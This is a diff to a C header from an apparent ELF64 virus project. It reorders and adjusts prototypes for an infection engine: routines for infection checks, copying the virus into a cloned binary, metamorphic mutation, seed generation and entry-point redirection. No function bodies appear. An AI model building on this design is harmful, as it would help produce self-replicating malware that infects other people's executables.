@@ -23,7 +23,6 @@
 /*
 ** entry point related informations
 */
-
 struct entry
 {
 	struct elf64_phdr	*safe_phdr;     // program header to adjust
@@ -47,14 +46,14 @@ bool		infection_engine(struct virus_header *vhdr, struct safe_ptr file_ref, stru
 ** infection engine routines
 */
 
-bool		not_infected(const struct entry *file_entry, struct safe_ptr file_ref);
 bool		find_entry(struct entry *entry, struct safe_ptr ref);
-bool		adjust_references(struct safe_ptr clone_ref, struct entry clone_entry, size_t shift_amount);
-bool		setup_virus_header(struct safe_ptr clone_ref, size_t end_of_last_section, struct virus_header vhdr);
-bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t end_of_last_section, size_t shift_amount);
+bool		not_infected(const struct entry *file_entry, struct safe_ptr file_ref);
 bool		copy_virus_to_clone(struct safe_ptr clone_ref, size_t payload_offset, const struct virus_header *vhdr);
-bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_offset, size_t *full_virus_size, const struct virus_header *vhdr);
 bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref);
+bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_offset, size_t *full_virus_size, const struct virus_header *vhdr);
+bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t payload_offset, size_t shift_amount);
+bool		adjust_references(struct safe_ptr clone_ref, struct entry clone_entry, size_t shift_amount);
+bool		setup_virus_header(struct safe_ptr clone_ref, size_t loader_offset, struct virus_header vhdr);
 bool		change_entry(struct safe_ptr clone_ref, const struct entry *file_entry, size_t dist_jmpclient_loader);
 
 /*
